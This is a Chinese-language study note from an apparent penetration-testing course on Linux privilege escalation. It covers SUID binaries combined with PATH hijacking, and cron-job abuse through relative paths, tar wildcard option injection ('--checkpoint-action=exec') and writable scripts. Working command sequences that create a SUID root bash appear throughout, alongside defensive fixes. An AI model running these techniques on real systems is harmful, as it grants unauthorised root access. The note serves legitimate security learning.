# 2026-08-30 Linux 提权：定时任务提权（路径/命令/权限三类问题）+ 环境变量提权（SUID 配合 PATH 劫持）

> 状态：🧪 理论（课程案例截图），待实操
> 承接 08-28(续2) 框架 + 08-28(续3)（自动化脚本/内核/SUID）：今天把框架「提权方法 5 类」里的**环境变量**和**计划任务**两个分支落地。课程案例：**案例1** 环境变量提权（SUID 配合 PATH 劫持）；**案例2** 定时任务安全三问题（路径问题 / 命令问题 / 权限问题）；**案例4** Linux 提权总结归类（参考 PDF）。数据库提权 = 框架「第三方服务」分支，已有 08-28 专门笔记。

## 一、一句话认知

**环境变量提权 = 劫持 SUID 程序调用的外部命令**（程序内部调命令没写绝对路径 → 我们用 PATH 让它执行我们的同名文件）；**定时任务提权 = 劫持 root 的 cron**，三种思路：路径问题（相对路径被替换）、命令问题（通配符注入 tar 参数）、权限问题（脚本可写被覆盖）。**本质都是「高权限进程 + 我们可控的输入点」**——和 Windows 服务提权、数据库提权是同一个套路。

## 二、案例1：环境变量提权（SUID 配合 PATH 劫持，本地用户环境）

### 原理

- 有个 **root 属主 + SUID 位** 的程序（比如 `shell`），内部调用了外部命令（如 `system("ps")`），但**用的是命令名而不是绝对路径**
- 普通用户执行这个 SUID 程序 → 程序以 **root 身份**去 PATH 里找 `ps` 并执行 → 但我们能控制 PATH → 让程序先找到我们的假 `ps`（其实是 `/bin/sh` 的副本）→ 以 root 执行 → 拿到 root shell
- 课程定位：**本地用户环境**（已有 shell 的普通用户）

### 利用链（课程口诀：手写调用文件 → 编译 → 复制文件 → 增加环境变量 → 执行触发）

```bash
# ① 手写调用文件：写一个调用外部命令的 C 程序（如 system("ps")），编译
gcc demo.c -o shell
#    （shell 是 root 属主且设了 SUID：chmod u+s shell）

# ② 复制文件：把 /bin/sh 复制成程序要调用的命令名，放我们可控目录
cp /bin/sh /tmp/ps

# ③ 增加环境变量：让 /tmp 排在 PATH 最前面
export PATH=/tmp:$PATH

# ④ 执行触发：SUID 程序以 root 找 ps → 找到 /tmp/ps(=/bin/sh) → root shell
./shell

# ⑤ 验证
id
```

### 关键点 / 踩坑

- demo.c 必须调用**非绝对路径**的外部命令（`system("ps")` 而不是 `system("/bin/ps")`）——这是能被劫持的前提
- `/tmp/ps` 的名字必须和程序调用的命令名**完全一致**（调 ps 就命名 ps）
- `export PATH=/tmp:$PATH` 中 `/tmp` 必须**放最前面**才抢得到（PATH 按顺序找）
- 和 08-28(续3) 的 SUID 提权区别：SUID 是直接利用程序自带功能（find -exec / python / vim），环境变量是**借 SUID 程序的命令调用链**偷换命令——两条路都要求有 root 的 SUID 程序，但利用点不同

## 三、案例2：定时任务提权（三种问题）

### ① 路径问题——利用计划任务指向文件的**相对路径解析**

- 原理：root 的 crontab 里执行的脚本用了**相对路径**（不是绝对路径），cron 执行时会在可预测的位置找该文件 → 我们提前把同名恶意脚本放到那个位置 → 被 root 以 root 权限执行
- 命令序列（课程案例）：
```bash
cat /etc/crontab     # 先看计划任务，找相对路径目标
# 造恶意脚本：复制 bash 并设 SUID，最终目标是 /tmp/bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/xiaodi/test.sh
chmod +x /home/xiaodi/test.sh
/tmp/bash            # 执行 SUID bash → root shell
```
- 一句话：**root 用相对路径调脚本，我们提前把同名脚本放到它解析的位置**
- ❓ 待对照：crontab 里相对路径具体写法（`* * * * * root test.sh`？cron 执行时工作目录在哪？）——课程只给了劫持命令，没给 crontab 原文

### ② 命令问题——通配符配合命令参数自定义命令（tar 通配符注入）

- 原理：root 的**备份定时任务**用了带通配符的 tar 命令，`*` 会把目录里所有文件名展开成 tar 的参数 → 我们创建**名字以 `--` 开头（长得像选项）的文件** → tar 把它们当命令行选项解析 → 用 `--checkpoint-action=exec` 让 tar 在 checkpoint 时执行任意命令
- 不安全定时任务备份命令：`cd /home/undead/script; tar czf /tmp/backup.tar.gz *`
- 利用（课程案例）：
```bash
# ① 写恶意脚本（造 SUID bash）
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.sh

# ② 创建两个"长得像 tar 选项"的文件（内容为空，名字就是注入点）
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
```
- 触发链：root cron 跑 `tar czf /tmp/backup.tar.gz *` → `*` 展开出 `--checkpoint=1` 和 `--checkpoint-action=exec=sh test.sh` → tar 把它们解析成选项 → 每处理 1 个文件触发 checkpoint → 执行 `sh test.sh` → test.sh 造出 SUID bash → `/tmp/bash` 提权
- 参考命令：https://www.cnblogs.com/manong--/p/8012324.html
- 防御角度：tar 的 `*` 前加 `./` 或绝对路径、用 `--` 结束选项解析、脚本目录权限收紧

### ③ 权限问题——不安全的权限分配导致的定时文件覆盖

- 原理：定时任务指向的**脚本/目录被设置 777/775 等宽松权限** → 普通用户（或组内成员）能直接写/覆盖 → 把内容改成恶意命令 → 等 cron 以 root 执行
- chmod 数字位说明：**777** = 所有者/组/其他 全部可读可写可执行（人人都能改）；**775** = 所有者/组可读写执行、其他只读执行（威胁面主要是**组内成员**）
- 检查：`ls -la` 看 cron 脚本权限；`find / -perm -777 -o -perm -775` 找宽松权限文件
- 防御：cron 脚本属主 root、权限收紧（700/755），所在目录普通用户不可写

### 定时任务排查速查（框架信息收集第 5 项的落地）

```bash
crontab -l                                    # 当前用户计划任务
cat /etc/crontab                              # 系统计划任务
ls /etc/cron.d /etc/cron.daily /etc/cron.hourly   # 各定时目录
```
- 看什么：root 执行的脚本 → 路径是绝对还是相对（路径问题）、脚本/目录是否可写（权限问题）、命令是否带通配符（命令问题）

## 四、案例4：Linux 提权总结归类（参考 PDF）

1. **提权环境信息收集**：SUID、定时任务、可能漏洞、第三方服务应用等 —— 就是框架 8 项清单，自动化用 LinEnum / linuxprivchecker（08-28(续3)）
2. **最新相关漏洞要明确（关注点）**：关注新公开的内核/提权漏洞；**二次开发相关脚本学会展望（四个脚本）**——指 LinEnum / linuxprivchecker / linux-exploit-suggester / linux-exploit-suggester2，不光会用，还要能看源码/改造
3. **本地 searchsploit 脚本 + 远程 exploitdb 站点搜索**：`searchsploit linux 提权关键词` 本地搜（Kali 自带）；exploit-db.com 远程搜——漏洞探针（linux-exploit-suggester）的补充手段
4. **其他提权方法**：
   - **密码复用**（运气）——撞到 root 复用密码/口令复用
   - **gid**（同理）——和 SUID/权限位同思路，属组权限利用
   - **sudo**（鸡肋？）——课程一句话带过，但 sudo 配置错误实际是重要提权面，freebuf 专门文章：https://www.freebuf.com/vuls/217089.html（❓ 待对照）

## 五、总结：今天内容 ↔ 框架映射

| 框架分支（08-28(续2)） | 落地笔记 |
|---------|------------|
| 提权方法-环境变量 | **案例1：SUID + PATH 劫持**（本笔记） |
| 提权方法-计划任务 | **案例2：路径/命令/权限三问题**（本笔记） |
| 提权方法-第三方服务 | 数据库提权（08-28 五大库笔记） |
| 提权方法-SUID / 内核漏洞 | 08-28(续3) |
| 信息收集 | 8 项清单 + LinEnum / linuxprivchecker / searchsploit |

**一句话串起来**：Linux 提权 = 信息收集（8 项 + 脚本）→ 配置类（SUID / 环境变量 / 定时任务 / 权限）→ 内核类（探针 + EXP）；定时任务三问题本质 = **root 定时执行的东西里，有我们能插手的点**（路径可替换 / 参数可注入 / 文件可覆盖）。

## 疑问

1. ❓ crontab 相对路径劫持的具体 crontab 写法（工作目录是哪？）——课程只给了劫持命令，没给 crontab 原文
2. ❓ tar 通配符注入里 `--checkpoint` 的具体机制（checkpoint 间隔、exec 完整语法、tar 版本要求）——待对照 cnblogs 参考链接
3. ❓ sudo 提权（sudo -l / sudoers 错误配置）具体手法——课程一句话带过，freebuf 文章待读
4. ❓ 密码复用 / GID 提权的具体场景？

## 关联笔记

- [2026-08-28(续2)-Linux提权-总体框架.md](./2026-08-28(续2)-Linux提权-总体框架.md) — 本篇是「环境变量」「计划任务」两个分支的落地
- [2026-08-28(续3)-Linux提权-自动化脚本与内核漏洞与SUID.md](./2026-08-28(续3)-Linux提权-自动化脚本与内核漏洞与SUID.md) — 同课：信息收集脚本/内核/SUID；案例4 的"四个脚本"即这篇
- [2026-08-28-数据库提权-五大数据库.md](./2026-08-28-数据库提权-五大数据库.md) — 「第三方服务」分支 = 数据库提权
- [2026-08-15-DC1靶机渗透实战.md](./2026-08-15-DC1靶机渗透实战.md) — SUID find 提权实操（SUID 分支实战）

## 待实践

- 靶机复现环境变量提权（写 demo.c → SUID → PATH 劫持 → id 验证）
- 复现 tar 通配符注入（自己搭 cron 备份场景即可，无需专门靶机）
- searchsploit 本地搜一遍内核 EXP 用法
- 补 sudo 提权（读 freebuf 217089 文章）

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
